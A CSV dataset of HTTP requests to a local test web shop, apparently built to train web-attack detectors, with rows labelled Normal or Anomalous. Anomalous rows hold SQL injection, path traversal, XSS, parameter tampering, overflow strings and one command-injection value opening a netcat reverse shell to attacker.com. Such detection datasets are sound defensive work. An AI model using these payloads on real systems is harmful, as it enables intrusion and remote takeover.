Unnamed: 0,Method,User-Agent,Pragma,Cache-Control,Accept,Accept-encoding,Accept-charset,language,host,cookie,content-type,connection,lenght,content,classification,URL
Anomalous,POST,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.1",en,localhost:8080,JSESSIONID=DF4CB1AFB3AB838FA2CFEFAAFAC2ED50,application/x-www-form-urlencoded,close,71,correo=1%20OR%20BENCHMARK%281000000%2CMD5%281%29%29--&password=anything,1,http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1
Anomalous,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.1",en,localhost:8080,JSESSIONID=FE5814B8F86AFC23C71DA0EA78C8F0A6,application/x-www-form-urlencoded,close,995,correo=BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&password=pass,1,http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1
Normal,GET,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.1",en,localhost:8080,JSESSIONID=F5A25FF9E3DE7AA1F3FE9C732D0571D4,,close,,,0,http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2&nombre=Jamon+Iberico&precio=75&cantidad=76&B1=A%C3%B1adir+al+carrito HTTP/1.1
Normal,GET,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.1",en,localhost:8080,JSESSIONID=DECAE5B47DC0A9B54ECF17B2FC4BE6D5,,close,,,0,http://localhost:8080/tienda1/publico/autenticar.jsp?id=28&nombre=Queso+Manchego&precio=311&cantidad=90&B1=A%C3%B1adir+al+carrito HTTP/1.1
Anomalous,GET,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.1",en,localhost:8080,JSESSIONID=DCFCC58E0DA0043AA7798B3690FCA63F,,close,,,1,http://localhost:8080/tienda1/publico/anadir.jsp?nombre=%2e%2e%2f%2e%2e%2f%2e%2e%2fWEB-INF/web.xml HTTP/1.1
Normal,GET,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0,no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.1",en,localhost:8080,JSESSIONID=8BD8CAB7877D2FDCEE23B369AFCDF1B1,,close,,,0,http://localhost:8080/tienda1/publico/autenticar.jsp?id=1&nombre=Vino+Rioja&precio=62&cantidad=93&B1=A%C3%B1adir+al+carrito HTTP/1.1
Normal,POST,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.1",en,localhost:8080,JSESSIONID=AE9C3DD55BEF54AF6AC5DFA3A1BADBEC,application/x-www-form-urlencoded,close,40,correo=carlos@mail.com&password=uzNqdLne,0,http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1
Normal,GET,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0,no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.1",en,localhost:8080,JSESSIONID=3908413AC9998BA0498C68ACB15CA932,,close,,,0,http://localhost:8080/tienda1/publico/autenticar.jsp?id=45&nombre=Jamon+Iberico&precio=276&cantidad=23&B1=A%C3%B1adir+al+carrito HTTP/1.1
Anomalous,GET,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.1",en,localhost:8080,JSESSIONID=56F98FFDE6AE7A0BDAD30D2C8E1EC2FB,,close,,,1,http://localhost:8080/tienda1/publico/buscar.jsp?query=%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E HTTP/1.1
Normal,GET,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.1",en,localhost:8080,JSESSIONID=4FADABB4D629ABDFDCEA7CDC07AFA7F0,,close,,,0,http://localhost:8080/tienda1/index.jsp HTTP/1.1
Normal,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.1",en,localhost:8080,JSESSIONID=E594FA624ABACBC7AD7E7757DD762691,application/x-www-form-urlencoded,close,98,nombre=Ana+Fernandez&apellidos=Apellido&correo=maria@mail.com&password=Pass1234&telefono=648763723,0,http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1
Normal,GET,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.1",en,localhost:8080,JSESSIONID=FD3F4969B849ECFA4BBA8FF4DFEF8CC9,,close,,,0,http://localhost:8080/tienda1/publico/buscar.jsp?query=queso HTTP/1.1
Normal,POST,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0,no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.1",en,localhost:8080,JSESSIONID=A8AD3F3C4144FFEA5BDD5FEAFD8EE12D,application/x-www-form-urlencoded,close,38,correo=juan@mail.com&password=LyeqmbEB,0,http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1
Normal,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.1",en,localhost:8080,JSESSIONID=FAEE32BAFE36CC77D32EDAEF9FEE0A31,application/x-www-form-urlencoded,close,37,correo=ana@mail.com&password=u2beZc0f,0,http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1
Normal,GET,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.1",en,localhost:8080,JSESSIONID=1AFB29BC0385781CA9DABCC56CA8CCD2,,close,,,0,http://localhost:8080/tienda1/publico/buscar.jsp?query=queso HTTP/1.1
Anomalous,POST,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0,no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.1",en,localhost:8080,JSESSIONID=C9BF75C2C8A5B4F7ED75CB9FABDB996B,application/x-www-form-urlencoded,close,476,correo=BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&password=pass,1,http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1
Anomalous,GET,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.1",en,localhost:8080,JSESSIONID=266B62EF7DC9605595C6EBC0F4E5D07B,,close,,,1,http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=../../../../../../WEB-INF/classes/config.properties HTTP/1.1
Normal,GET,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.1",en,localhost:8080,JSESSIONID=5B02A5B832648198280481D8AB7F5FE3,,close,,,0,http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=31&nombre=Jamon+Iberico&precio=209&cantidad=5&B1=A%C3%B1adir+al+carrito HTTP/1.1
Normal,GET,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.1",en,localhost:8080,JSESSIONID=C7AC81BE1DAE53D3A7BEC5B8ADDEAEE9,,close,,,0,http://localhost:8080/tienda1/index.jsp HTTP/1.1
Normal,GET,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.1",en,localhost:8080,JSESSIONID=98AA6BC6CCAFEBEFB41358DCE0B6226C,,close,,,0,http://localhost:8080/tienda1/publico/autenticar.jsp?id=30&nombre=Cerveza+Artesanal&precio=275&cantidad=14&B1=A%C3%B1adir+al+carrito HTTP/1.1
Normal,GET,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.1",en,localhost:8080,JSESSIONID=AB4C6BCAFCAD6BD4EDD57A3EED95DBFA,,close,,,0,http://localhost:8080/tienda1/publico/autenticar.jsp?id=46&nombre=Vino+Rioja&precio=64&cantidad=30&B1=A%C3%B1adir+al+carrito HTTP/1.1
Normal,GET,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0,no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.1",en,localhost:8080,JSESSIONID=60DECDE0E5FC1CAF5296D0E6DF6CF6BC,,close,,,0,http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2&nombre=Aceite+Oliva&precio=491&cantidad=7&B1=A%C3%B1adir+al+carrito HTTP/1.1
Anomalous,GET,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.1",en,localhost:8080,JSESSIONID=E6CD95ACEB9BBEDC8B65ACF7D8D7FEBC,,close,,,1,http://localhost:8080/tienda1/publico/buscar.jsp?query=%3Cbody%20onload%3Dalert%28%27XSS%27%29%3E HTTP/1.1
Normal,GET,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0,no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.1",en,localhost:8080,JSESSIONID=BB779AA08EACBFBB41C571A7E1E6A745,,close,,,0,http://localhost:8080/tienda1/publico/buscar.jsp?id=48&nombre=Vino+Rioja&precio=226&cantidad=61&B1=A%C3%B1adir+al+carrito HTTP/1.1
Normal,GET,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.1",en,localhost:8080,JSESSIONID=98F9CFDD48AC485641AD0CDC9AADAFDD,,close,,,0,http://localhost:8080/tienda1/index.jsp HTTP/1.1
Anomalous,GET,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0,no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.1",en,localhost:8080,JSESSIONID=F4EE13DB946AB13A3CE962D6107A1E7E,,close,,,1,http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=Queso+Manchego&precio=-1&cantidad=29&B1=Comprar HTTP/1.1
Anomalous,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.1",en,localhost:8080,JSESSIONID=05EFEB585BACD46B11E8DF5B61AF0A51,application/x-www-form-urlencoded,close,71,correo=admin%7C%20nc%20-e%20/bin/sh%20attacker.com%204444&password=pass,1,http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1
Anomalous,GET,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.1",en,localhost:8080,JSESSIONID=CF7FDC6AABBAEECFE2ADE107457FB859,,close,,,1,http://localhost:8080/tienda1/publico/buscar.jsp?password=%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41%5Cx41 HTTP/1.1
Normal,GET,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.1",en,localhost:8080,JSESSIONID=4EFA2B0D7C64634FDE1D09315A7787B5,,close,,,0,http://localhost:8080/tienda1/publico/buscar.jsp?query=aceite HTTP/1.1
Normal,GET,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0,no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.1",en,localhost:8080,JSESSIONID=AAEB79DF31DB658FF477B34B3BCCB9F3,,close,,,0,http://localhost:8080/tienda1/index.jsp HTTP/1.1
Normal,POST,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.1",en,localhost:8080,JSESSIONID=89CEC91B5DF0E03218BF24E6C9FACECB,application/x-www-form-urlencoded,close,47,tarjeta=4052045597268623&mes=01&anio=29&cvv=430,0,http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1
Anomalous,GET,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.1",en,localhost:8080,JSESSIONID=3FF420EECC21E29F2F4E1E115EB6AB14,,close,,,1,http://localhost:8080/tienda1/publico/buscar.jsp?query=%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541%2541 HTTP/1.1
